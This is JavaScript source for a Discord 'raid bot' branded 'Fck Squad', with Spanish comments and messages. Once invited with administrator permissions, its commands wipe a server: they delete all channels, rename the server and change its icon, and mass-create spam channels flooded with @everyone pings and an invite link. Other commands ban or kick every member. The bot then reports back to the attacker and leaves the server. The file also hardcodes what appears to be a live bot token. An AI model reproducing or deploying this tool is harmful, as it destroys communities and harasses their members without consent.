const { Client, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField} = require('discord.js');
const client = new Client({intents: [103423]});
const fetch = require('node-fetch');
const bot_token = "MTQwODU5MTc4Njk2NzgyNjUzMg.GJttXC.u75H8AhzPJqYS0HzZprRZCbaDAxxWyMMSQwEbM"; // Introducir el token del bot
const prefix = "."; // Prefijo del bot
const names_channels = ["☠️☠️", "💀💀", "☠️☠️", "💀💀"];
const userid_vip = ["tu ID de Discord xdxd", "1189795248826744958"];
async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
let en_raid = false;
let mensajes_enviados = 0;
let canales_creados = 0;
let canales_borrados_exito = false;
let nombre_server_cambiado = false;
let icon_server_cambiado = false;
client.on(`ready`,()=>{
    console.log(`> Bot ${client.user.username} activo.`);
    console.log(`> Invitación del Bot (administrador permisos): https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot`)
});
client.on(`channelCreate`,async (channel)=>{
    if(names_channels.includes(channel.name)){
        try {
            await channel.send({content:`@everyone | @here\https://discord.gg/z5Z5Gzsh8R`}).then(async (mensajexd)=>{await channel.messages.cache.get(mensajexd.id).delete();}).catch((e)=>{console.log(e)})
            await channel.send({embeds:[
                        new EmbedBuilder()
                        .setImage(`https://cdn.discordapp.com/attachments/1404608445440594000/1404826148273262634/Nuevo_proyecto_3_48614BD.gif?ex=68a725ce&is=68a5d44e&hm=a107fb377f11192813880730ef9787460c2a60cdba9fb8980b024de633f2c3a6&`)
                        .setTitle(`**-                           /Fck Squad                           -
     
                      -        TOP BOT RAID        -
     
              - https://discord.gg/z5Z5Gzsh8R -
     
     -          OWNERS: /FCKSQUAD     -**`)
            ]}).catch((e)=>{console.log(e)})
            mensajes_enviados++;
        } catch (e) {
            console.log(e)
        }
    };
});
async function leave_xd(guild, userid_raid) {
    let guildxd = client.guilds.cache.get(guild.id);
    await wait_ms(60000);
    await client.users.cache.get(userid_raid).send({content:`\`\`\`-> Informe de 1 minuto luego del raid <-\`\`\``});
    if(canales_borrados_exito===true){
        await client.users.cache.get(userid_raid).send({embeds:[
            new EmbedBuilder()
            .setTimestamp()
            .setTitle(`Raid Info | GuildChannels`)
            .setDescription(`:spider_web: | Se eliminaron los canales del servidor.`)
        ]});
    };
    await client.users.cache.get(userid_raid).send({embeds:[
        new EmbedBuilder()
        .setTimestamp()
        .setTitle(`Raid Info | GuildChannels`)
        .setDescription(`:spider_web: | Se crearon ${canales_creados} canales..`)
    ]});
    await client.users.cache.get(userid_raid).send({embeds:[
        new EmbedBuilder()
        .setTimestamp()
        .setTitle(`Raid Info | GuildTags`)
        .setDescription(`:spider_web: | Se realizaron **${mensajes_enviados}** tags en 1 minuto.`)
    ]});
    if(nombre_server_cambiado===true){
        await client.users.cache.get(userid_raid).send({embeds:[
            new EmbedBuilder()
            .setTimestamp()
            .setTitle(`Raid Info | GuildNames`)
            .setDescription(`:white_check_mark: | El nombre del servidor fue cambiado a **" #Domados by Fcksquad 🦇 "**.`)
        ]});
    };
    if(icon_server_cambiado===true){
        await client.users.cache.get(userid_raid).send({embeds:[
            new EmbedBuilder()
            .setTimestamp()
            .setTitle(`Raid Info | GuildIcon`)
            .setDescription(`:white_check_mark: | La imagen del servidor ha sido cambiada correctamente.`)
        ]});
    };
    await client.users.cache.get(userid_raid).send({content:`\`\`\`->          Fin del informe          <-\`\`\``});
    en_raid=false;
    nombre_server_cambiado = false;
    icon_server_cambiado = false;
    canales_borrados_exito = false;
    mensajes_enviados=0;
    canales_creados=0;
    await guildxd.leave();
};
client.on(`messageCreate`,async (msg)=>{
    //Comandos ayuda
    if(msg.content === prefix+"vanity"){
        await msg.author.send({content:`\`\`\`->     RAID BOT TOP, SUPLIED BY: /fcksquad    <-\`\`\``});
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setColor(`#ec4346`)
            .setDescription(`:dolce_356~2: Recuerda poner el bot lo mas arriba posible para mejor funcionamiento!!`),
            new EmbedBuilder()
            .setColor(`#ec4346`)
            .setDescription(`:dolce_356~2: **Luego de 1 minuto de haber utilizado un comando raid, el bot abandonara el servidor en el que el comando fue ejecutado.
(Es posible utilizar varios comandos a la vez)**`)
        ]});
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setColor(`#232426`)
            .setThumbnail(`https://cdn.discordapp.com/attachments/1407899858282614826/1408547984819491027/f60f29177e2432e41dbeba719d1fedfa.gif?ex=68aa2409&is=68a8d289&hm=227eb63b06ad0c59900b8a8981c3eca82af55fe8e9bd8b7d213c335d1f37b437&`)
            .setTitle(`Commands`)
            .setDescription(`Actualmente los unicos comandos son:

.fvcked **(raid to the server)** Fcksquad
.banall **(banall members of the server)** Fcksquad
.kickall **(kickall members of the server)** Fcksquad
.nucked **(delete all channels of the server)** Fcksquad
.spam (makes 10 tags on all server channels **(- of 30 seconds))**
Fcksquad`),
            new EmbedBuilder()
            .setColor(`#232426`)
            .setImage(`https://cdn.discordapp.com/attachments/1407899858282614826/1408547984819491027/f60f29177e2432e41dbeba719d1fedfa.gif?ex=68aa2409&is=68a8d289&hm=227eb63b06ad0c59900b8a8981c3eca82af55fe8e9bd8b7d213c335d1f37b437&`)
            .setFooter({text:`- This bot is offered by brzzl and its administrative Fcksquad. -`})
            .setDescription(`:star_black: [Click here to invite me](https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot)`)    
        ]})
        await msg.author.send({content:`\`\`\`->     RAID BOT TOP, SUPLIED BY: /dolce    <-\`\`\``});
    };
    if(msg.content === prefix+"help"){
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setColor(`#232426`)
            .setThumbnail(`https://cdn.discordapp.com/attachments/1404608445440594000/1404826148273262634/Nuevo_proyecto_3_48614BD.gif?ex=68a725ce&is=68a5d44e&hm=a107fb377f11192813880730ef9787460c2a60cdba9fb8980b024de633f2c3a6&`)
            .setFooter({text:`- This bot is offered by fcksquad and its administrative Fcksquad. -`})
            .setDescription(`**Commands help**
1 - \`Puede usar comandos .vanity ( o obtener el enlace para invitar al bot al gremio y los comandos del bot ) .cmds ( o obtener los comandos que el bot )\`

**Important information**
1 - \`No puedes atacar los servidores que son propiedad de /Fcksquad.\` Fcksquad


2 - \`No puedes usar los comandos .fvcked y .spam repetidamente, debes esperar 1 minuto en fvcked y 30 segundos en spam (esto también se aplica si hay un ataque de estos activos por parte de otras personas)\` Fcksquad


3 - \`Después de usar un comando de ataque en un servidor, el bot abandonará ese servidor después de un minuto, independientemente del comando.\` Fcksquad


4 - \`El bot te dará un informe de lo que sucedió cada vez que uses un comando de ataque.\` Fcksquad


**:star_black: Eso es todo por ahora, ¡espero que disfrutes del bot!** :star_black:`)
        ]})
    };
    if(msg.content === prefix+"cmds"){
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`Commands`)
            .setThumbnail(`https://cdn.discordapp.com/attachments/1404608445440594000/1404826148273262634/Nuevo_proyecto_3_48614BD.gif?ex=68a725ce&is=68a5d44e&hm=a107fb377f11192813880730ef9787460c2a60cdba9fb8980b024de633f2c3a6&`)
            .setFooter({text:`- This bot is offered by Nicolas and its administrative FCKSQUAD. -`})
            .setDescription(`The commands of the bot raid are:

.fvcked **(raid to the server)** Fck Squad
.banall **(banall members of the server)** Fck Squad
.kickall **(kickall members of the server)** Fck Squad
.nucked **(delete all channels of the server)** Fck Squad
.spam **(makes 10 tags on all server channels (- of 30 seconds))** Fck Squad`)
        ]})
    };
    //
    //by FCKSQUAD jejeje - Nicolas
    //Comandos de ataque
    if(msg.content === prefix+"fvcked"){
        leave_xd(msg.guild, msg.author.id);
        if(en_raid === true){
            await msg.delete().catch((e)=>{});
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`ERROR!!`)
                .setColor(`#ec4346`)
                .setDescription(`**YA HAY UN RAID EN CURSO!!**\n**${msg.author.username}** en este momento hay un raid en curso, por favor espera a que termine (maximo un minuto) :dolce_183~1:`)
            ]})
            return;
        };
        userid_raid = msg.author.id;
        en_raid = true;
        nombre_server_cambiado = false;
        icon_server_cambiado = false;
        canales_borrados_exito = false;
        mensajes_enviados=0;
        canales_creados=0;
        async function crear_ch(namexd) {
            try {
                const res = await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`,{
                    method:'POST',
                    headers: {
                        "Authorization":`Bot ${bot_token}`,
                        "content-type":"application/json"
                    },
                    body: JSON.stringify({
                        "name":`${namexd}`,
                        "type":"0",
                        "topic":"T̷H̷E̷ ̷S̷E̷R̷V̷E̷R̷ ̷H̷A̷S̷ ̷B̷E̷E̷N̷ ̷FVCKED"
                    })
                });
                if(res.status === 201){
                    canales_creados++;
                };
            } catch (e) {
                console.log(e);
            }
        };
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setThumbnail(`https://cdn.discordapp.com/attachments/1407899858282614826/1407900861019062433/a283cbc4b09c7642ff9867b1489ecc77.jpg?ex=68a7c95a&is=68a677da&hm=b35b056755acf814dfced78da5f2fdeb4ce42310788769e975dae550cba2a3de&`)
            .setDescription(`:homie_star: You have started a raid ( .fvcked ) in **${msg.guild.name}**`)
        ]});
        let channelsxd = await msg.guild.channels.fetch();
        for (const ch of channelsxd.values()) {
            ch.delete().catch((e)=>{console.log(e)});
        };
        if(channelsxd.size === 0){
            canales_borrados_exito=true;
        };
        await msg.guild.setName(`#Domados by Fcksquad 🦇`).then(nombre_server_cambiado=true);
        await msg.guild.setIcon(`https://cdn.discordapp.com/attachments/1407899858282614826/1407900861019062433/a283cbc4b09c7642ff9867b1489ecc77.jpg?ex=68a7c95a&is=68a677da&hm=b35b056755acf814dfced78da5f2fdeb4ce42310788769e975dae550cba2a3de&`).then(icon_server_cambiado=true);
        for (let index = 0; index < 85; index++) {
            let randomName = Math.floor(Math.random() * names_channels.length);
            crear_ch(names_channels[randomName]).catch((e)=>{console.log(e)})
            await wait_ms(150);
        };
        let channelsxdd = await msg.guild.channels.fetch();
        async function enviar_mensajes(chxd) {
            try {
                let channelxd = client.guilds.cache.get(msg.guild.id).channels.cache.get(chxd.id);
                for (let index = 0; index < 20; index++) {
                    await channelxd.send({content:`@everyone | @here\https://discord.gg/z5Z5Gzsh8R`}).catch((e)=>{console.log(e)})
                    await channelxd.send({embeds:[
                        new EmbedBuilder()
                        .setImage(`https://cdn.discordapp.com/attachments/1404608445440594000/1404826148273262634/Nuevo_proyecto_3_48614BD.gif?ex=68a725ce&is=68a5d44e&hm=a107fb377f11192813880730ef9787460c2a60cdba9fb8980b024de633f2c3a6&`)
                        .setTitle(`**-                           /Fck Squad                           -
    
                    -        TOP BOT RAID        -
    
            - https://discord.gg/z5Z5Gzsh8R -
    
    -          OWNERS: /FCKSQUAD     -**`)
                    ]}).catch((e)=>{console.log(e)})
                    mensajes_enviados++;
                };
        } catch (e) {
            console.log(e)
        }
        };
        for (const ch of channelsxdd.values()) {
            enviar_mensajes(ch).catch((e)=>{console.log(e)})
        };
        for (let index = 0; index < 30; index++) {
            try {
                let randomName = Math.floor(Math.random() * names_channels.length);
                await msg.guild.channels.create({name:names_channels[randomName],type:ChannelType.GuildText,topic:"T̷H̷E̷ ̷S̷E̷R̷V̷E̷R̷ ̷H̷A̷S̷ ̷B̷E̷E̷N̷ ̷FVCKED"}).then(canales_creados++).catch((e)=>{console.log(e)})
            } catch (e) {
                console.log(e)
            }
        };
    };
    if(msg.content === prefix+"banall"){
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setThumbnail(`https://cdn.discordapp.com/attachments/1407899858282614826/1407900861019062433/a283cbc4b09c7642ff9867b1489ecc77.jpg?ex=68a7c95a&is=68a677da&hm=b35b056755acf814dfced78da5f2fdeb4ce42310788769e975dae550cba2a3de&`)
            .setDescription(`:homie_star: You have started a raid ( .banall ) in **${msg.guild.name}**`)
        ]});
        let memberss = await msg.guild.members.fetch();
        for (const memberxd of memberss.values()) {
            memberxd.ban().catch((e)=>{console.log(e)});
        };
    };
    if(msg.content === prefix+"kickall"){
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setThumbnail(`https://i.ibb.co/s1PTrL8/c91a0f124ddb5a192dca2da415d8645e.png`)
            .setDescription(`:homie_star: You have started a raid ( .kickall ) in **${msg.guild.name}**`)
        ]});
        let memberss = await msg.guild.members.fetch();
        for (const memberxd of memberss.values()) {
            memberxd.kick().catch((e)=>{console.log(e)});
        };
    };
    if(msg.content === prefix+"nucked"){
        if(!userid_vip.includes(msg.author.id)){
            await msg.reply(`Este comando está reservado para nuestros usuarios VIP.`);
            return;
        } else {
            //No sé cómo será el nucked VIP pero supongo que es así:
            let channelss = await msg.guild.channels.fetch();
            for (const ch of channelss.values()) {
                ch.delete().catch((e)=>{console.log(e)});
            };
            await msg.guild.channels.create({name:'zenx-on-top',type:ChannelType.GuildText}).catch((e)=>{console.log(e)});
        }
    };
    if(msg.content === prefix+"spam"){
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setDescription(`:homie_star: You have started a raid ( .spam ) in **${msg.guild.name}**`)
        ]});
        let mensajes_enviados = 0;
        let mensajes_ids = [];
        async function enviar_mensajes(chxd) {
            let channelxd = client.channels.cache.get(chxd.id);
            for (let index = 0; index < 10; index++) {
                await channelxd.send({content:`@everyone | @here\https://discord.gg/z5Z5Gzsh8R`}).then((mensajexd)=>{mensajes_ids.push({mensaje_id: mensajexd.id,canal_id: channelxd.id})})
                await channelxd.send({embeds:[
                    new EmbedBuilder()
                    .setImage(`https://cdn.discordapp.com/attachments/1404608445440594000/1404826148273262634/Nuevo_proyecto_3_48614BD.gif?ex=68a725ce&is=68a5d44e&hm=a107fb377f11192813880730ef9787460c2a60cdba9fb8980b024de633f2c3a6&`)
                    .setTitle(`**-                           /Fck Squad                           -
 
                  -        TOP BOT RAID        -
 
          - https://discord.gg/z5Z5Gzsh8R -
 
 -          OWNERS: /FCKSQUAD     -**`)
                ]});
                mensajes_enviados++;
                if(mensajes_totales <= mensajes_enviados){
                    await msg.author.send({embeds:[
                        new EmbedBuilder()
                        .setTitle(`Raid Info | GuildTags`)
                        .setDescription(`:spider_web: | Se realizaron **${mensajes_enviados}** tags en menos de 30 segundos.`)
                        .setTimestamp()
                    ]});
                    for (let index = 0; index < mensajes_ids.length; index++) {
                        await msg.guild.channels.cache.get(mensajes_ids[index]['canal_id']).messages.cache.get(mensajes_ids[index]['mensaje_id']).delete();
                    };
                    return;
                };
            };
        };
        let channelsxd = await msg.guild.channels.fetch();
        let mensajes_totales = channelsxd.size*10;
        for (const ch of channelsxd.values()) {
            enviar_mensajes(ch);
        };
    };
});
client.login(bot_token);